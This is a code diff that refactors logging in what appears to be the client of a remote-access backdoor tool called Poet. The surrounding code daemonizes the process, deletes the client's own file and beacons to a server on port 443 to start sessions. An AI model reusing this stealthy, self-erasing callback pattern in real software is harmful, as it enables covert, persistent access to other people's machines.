@@ -13,10 +13,9 @@ import os.path
 import urllib2
 import argparse
 import tempfile
-import logging as log
 import subprocess as sp
-from datetime import datetime
 
+import debug
 import config as CFG
 from poetsocket import *
 
@@ -347,16 +346,17 @@ def daemonize():
 def main():
     global args
     args = get_args()
+
+    # daemonize if we're not in --no-daemon or --debug mode
     if not args.no_daemon and not args.debug:
         daemonize()
 
-    if args.debug:
-        log.basicConfig(format='%(message)s', level=log.INFO)
-    else:
-        log.basicConfig(format='%(message)s')
+    # disable debug messages if we're not in --debug
+    if not args.debug:
+        debug.disable()
 
     if not args.no_selfdestruct:
-        log.info('[+] Deleting client.')
+        debug.info('Deleting client')
         try:
             selfdestruct()
         except Exception as e:
@@ -366,22 +366,22 @@ def main():
     HOST = args.host
     PORT = int(args.port) if args.port else 443
 
-    log.info(('[+] Poet started with interval of {} seconds to port {}. Ctrl-c to exit.').format(args.interval, PORT))
+    debug.info(('Poet started with interval of {} seconds to port {}. Ctrl-c to exit').format(args.interval, PORT))
 
     try:
         while True:
             if is_active(HOST, PORT):
-                log.info('[+] ({}) Server is active'.format(datetime.now()))
+                debug.info('Server is active')
                 PoetClient(HOST, PORT).start()
             else:
-                log.info('[!] ({}) Server is inactive'.format(datetime.now()))
+                debug.warn('Server is inactive')
             time.sleep(args.interval)
     except KeyboardInterrupt:
         print
-        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
+        debug.err('Poet terminated')
     except socket.error as e:
-        log.info('[!] ({}) Socket error: {}'.format(datetime.now(), e.message))
-        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
+        debug.warn('Socket error: {}'.format(e.message))
+        debug.err('Poet terminated')
         sys.exit(0)
 
 if __name__ == '__main__':
